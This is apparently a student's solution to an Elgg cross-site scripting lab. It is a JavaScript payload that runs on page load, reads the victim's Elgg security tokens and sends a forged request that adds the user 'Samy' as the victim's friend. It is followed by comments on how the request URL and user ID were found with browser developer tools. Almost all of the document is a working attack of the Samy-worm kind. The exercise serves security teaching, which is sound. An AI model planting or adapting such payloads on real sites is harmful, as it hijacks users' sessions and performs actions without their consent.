<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token + ts + token;

if(elgg.session.user.guid != 47)
{
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
}
	}
</script>


// went to memebers_list from alice's profile, 
// enetered into samy's profile, opened inspect element, 
// went to network, 
// pressed add friend and got a GET request, clicked it 
// and found headers and request URL,
// typed elgg in the console and found session and from user got guid
// guid can also be found by right clicking and then selecting 'view page source'
    